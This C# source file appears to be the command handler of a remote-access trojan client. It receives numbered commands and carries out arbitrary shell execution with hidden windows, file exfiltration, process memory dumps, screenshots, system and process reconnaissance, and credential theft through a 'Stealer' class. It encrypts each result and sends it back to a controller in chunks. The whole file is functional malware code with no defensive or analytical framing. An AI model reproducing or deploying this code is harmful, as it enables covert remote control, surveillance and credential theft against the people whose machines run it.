using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Diagnostics.CodeAnalysis;
using Microsoft.Win32.SafeHandles;
using System.Drawing;
using System.Drawing.Imaging;
using System.ServiceModel.Channels;
using System.Management;
using Microsoft.Win32;
using System.Net;

namespace Client_side
{
    internal class HandleCommand
    {
        public static readonly int MaxChunkSize = 4096;
        public static object NativeMethods { get; private set; }
        private static readonly string delimiter = "|;|";

        public static void ProcessCommand(string command, Encryptor encryptor)
        {
            string[] commandParts = command.Split(delimiter);
            string id = commandParts[0];
            switch (id)
            {
                case "1":
                    {
                        string result = ExecuteCommand(commandParts[1]);
                        byte[] encryptedResult = encryptor.Encrypt(result);
                        NetworkLayer.SendResult(encryptedResult);
                        break;
                    }
                case "2":
                    {
                        List<string> fileChunks = GetFile(commandParts[1]);
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = fileChunks.Count.ToString();
                        string fileName = $"{commandParts[1]}";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(fileChunks, encryptor, fileID);
                        break;
                    }
                case "3":
                    {
                        List<string> systemInfoChunks = GetSystemInfo();
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = systemInfoChunks.Count.ToString();
                        string fileName = $"{commandParts[1]}.txt";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(systemInfoChunks, encryptor, fileID);
                        break;
                    }
                case "4":
                    {
                        List<string> dumpChunks = GetProcDump(commandParts[1]);
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = dumpChunks.Count.ToString();
                        string fileName = $"dump{commandParts[1]}.dmp";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(dumpChunks, encryptor, fileID);
                        break;
                    }
                case "5":
                    {
                        List<string> screenShotChunks = GetScreenShot();
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = screenShotChunks.Count.ToString();
                        string fileName = "screenshot.png";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(screenShotChunks, encryptor, fileID);
                        break;
                    }
                case "6":
                    {
                        List<string> procListChunks = GetProcList();
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = procListChunks.Count.ToString();
                        string fileName = "processes.txt";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(procListChunks, encryptor, fileID);
                        break;
                    }
                case "7":
                    {
                        List<String> credentialsChunks = Stealer.GetCredentials();
                        string fileID = Guid.NewGuid().ToString();
                        string fileLength = credentialsChunks.Count.ToString();
                        string fileName = "credentials.txt";

                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                        NetworkLayer.SendResult(encryptedHeader);

                        SendChunks(credentialsChunks, encryptor, fileID);
                        break;
                    }
                case "8":
                    {
                        NetworkLayer.SendResult(encryptor.Encrypt("Client - Logout"));
                        Environment.Exit(0);
                        break;
                    }
                default:
                    {
                        break;
                    }
            }
        }
        public static string ExecuteCommand(string command)
        {
            string result;
            string os = Environment.OSVersion.ToString();
            if (os.Contains("Windows"))
            {
                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.CreateNoWindow = true;
                    Process proc = new()
                    {
                        StartInfo = procStartInfo
                    };
                    proc.Start();
                    result = proc.StandardOutput.ReadToEnd();
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
            }
            else
            {
                try
                {
                    ProcessStartInfo procStartInfo = new ProcessStartInfo("/bin/bash", "-c " + command);
                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.CreateNoWindow = true;
                    Process proc = new()
                    {
                        StartInfo = procStartInfo
                    };
                    proc.Start();
                    result = proc.StandardOutput.ReadToEnd();
                }
                catch (Exception e)
                {
                    result = e.Message;
                }
            }
            
            return result;
        }

        public static List<string> GetFile(string path)
        {
            byte[] fileContent;
            try
            {
                fileContent = File.ReadAllBytes(path);
                string fileContent64 = Encryptor.ConvertStr(fileContent);
                List<string> chunks = new();
                for (int i = 0; i < fileContent64.Length; i += MaxChunkSize)
                {
                    chunks.Add(fileContent64.Substring(i, Math.Min(MaxChunkSize, fileContent64.Length - i)));
                }

                return chunks;
            }
            catch (Exception e)
            {
                return new List<string> { Encryptor.ConvertStr(e.Message) };
            }
        }


        public static List<string> GetProcDump(string pid)
        {
            return MiniDumpHandler.Minidump(int.Parse(pid));
        }


        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        private const int SM_XVIRTUALSCREEN = 76;
        private const int SM_YVIRTUALSCREEN = 77;
        private const int SM_CXVIRTUALSCREEN = 78;
        private const int SM_CYVIRTUALSCREEN = 79;

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public static Image CaptureDesktop()
        {
            SetProcessDPIAware();
            int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
            int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
            int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
            int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

            // Calculate the total bounds of all screens
            Rectangle bounds = new Rectangle(left, top, width, height);
            Bitmap result = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        public static Bitmap CaptureActiveWindow()
        {
            return CaptureWindow(GetForegroundWindow());
        }

        public static Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }

        private static List<String> GetScreenShot()
        {
            List<string> chunks = new();
            Image screenShot = CaptureDesktop();
            using (MemoryStream ms = new())
            {
                screenShot.Save(ms, ImageFormat.Png);
                byte[] imageBytes = ms.ToArray();
                string imageBase64 = Encryptor.ConvertStr(imageBytes);
                for (int i = 0; i < imageBase64.Length; i += MaxChunkSize)
                {
                    chunks.Add(imageBase64.Substring(i, Math.Min(MaxChunkSize, imageBase64.Length - i)));
                }
            }
            return chunks;
        }

        private static List<String> GetSystemInfo()
        {
            List<String> chunks = new();
            string systemInfo = "";

            // Retrieve the system information using Registry

            // Computer Name
            string path = @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
            {
                if (key != null)
                {
                    systemInfo += $"Computer Name: {key.GetValue("ComputerName")}\n";
                }
            }

            // OS Version
            string osVersion = Environment.OSVersion.ToString();
            systemInfo += $"OS Version: {osVersion}\n";

            // OS Name
            path = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
            {
                if (key != null)
                {
                    systemInfo += $"OS Name: {key.GetValue("productName")}\n";
                }
            }

            // CPU Name
            path = @"HARDWARE\DESCRIPTION\System\CentralProcessor\0";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
            {
                if (key != null)
                {
                    systemInfo += $"CPU Name: {key.GetValue("processorNameString")}\n";
                }
            }

            // User Name
            systemInfo += $"User Name: {Environment.UserName}\n";

            // Domain Name
            systemInfo += $"Domain Name: {Environment.UserDomainName}\n";

            // Public IP Address
            systemInfo += $"Public IP Address: {new WebClient().DownloadString("https://ipinfo.io/ip")}\n";

            // Private IP Address
            string hostName = Dns.GetHostName();
            IPHostEntry ipEntry = Dns.GetHostEntry(hostName);
            IPAddress[] addr = ipEntry.AddressList;
            systemInfo += $"Private IP Address: {addr[addr.Length - 1]}\n";

            // System Time
            systemInfo += $"System Time: {DateTime.Now}\n";

            // System TimeZone
            systemInfo += $"System Time Zone: {TimeZoneInfo.Local.DisplayName}\n";

            // System Uptime
            ManagementObjectSearcher searcher = new("SELECT LastBootUpTime FROM Win32_OperatingSystem");
            ManagementObjectCollection collection = searcher.Get();
            foreach (ManagementObject obj in collection)
            {
                DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
                TimeSpan uptime = DateTime.Now.ToUniversalTime() - lastBootUpTime.ToUniversalTime();
                systemInfo += $"System Uptime: {uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes\n";
            }

            // System Architecture
            if (Environment.Is64BitOperatingSystem)
            {
                systemInfo += "System Architecture: 64-bit\n";
            }
            else
            {
                systemInfo += "System Architecture: 32-bit\n";
            }

            // System Memory
            ManagementObjectSearcher searcher2 = new("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");
            ManagementObjectCollection collection2 = searcher2.Get();
            foreach (ManagementObject obj in collection2)
            {
                ulong totalMemory = (ulong)obj["TotalVisibleMemorySize"];
                ulong freeMemory = (ulong)obj["FreePhysicalMemory"];
                systemInfo += $"System Memory: {totalMemory / 1024} MB Total, {freeMemory / 1024} MB Free\n";
            }

            // System Disk Space
            ManagementObjectSearcher searcher4 = new("SELECT FreeSpace, Size FROM Win32_LogicalDisk WHERE DeviceID = 'C:'");
            ManagementObjectCollection collection4 = searcher4.Get();
            foreach (ManagementObject obj in collection4)
            {
                ulong freeSpace = (ulong)obj["FreeSpace"];
                ulong totalSpace = (ulong)obj["Size"];
                systemInfo += $"System Disk Space: {totalSpace / 1024 / 1024 / 1024} GB Total, {freeSpace / 1024 / 1024 / 1024} GB Free\n";
            }
            
            systemInfo = Encryptor.ConvertStr(Encoding.UTF8.GetBytes(systemInfo));

            for (int i = 0; i < systemInfo.Length; i += MaxChunkSize)
            {
                chunks.Add(systemInfo.Substring(i, Math.Min(MaxChunkSize, systemInfo.Length - i)));
            }

            return chunks;
        }

        private static List<string> GetProcList()
        {
            List<string> chunks = new();
            string procList = "";
            Process[] processes = Process.GetProcesses();
            // Format: ProcessName -- ProcessID -- ThreadCount -- MemoryUsage
            foreach (Process process in processes)
            {
                try
                {
                    string processName = process.ProcessName;
                    int processID = process.Id;
                    int threadCount = process.Threads.Count;
                    long memoryUsage = process.WorkingSet64;
                    procList += $"{processName} -- {processID} -- {threadCount} -- {memoryUsage}\n";
                }
                catch (Exception ex)
                {
                    procList += ex.ToString();
                }
            }
            
            procList = Encryptor.ConvertStr(Encoding.UTF8.GetBytes(procList));
            for (int i = 0; i < procList.Length; i += MaxChunkSize)
            {
                chunks.Add(procList.Substring(i, Math.Min(MaxChunkSize, procList.Length - i)));
            }
            return chunks;
        }

        private static void SendChunks(List<string> chunks, Encryptor encryptor, string fileID)
        {
            int counter = 0;
            foreach (string chunk in chunks)
            {
                string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                NetworkLayer.SendResult(encryptedChunk);
                Thread.Sleep(10);
                counter++;
            }
        }
    }
}
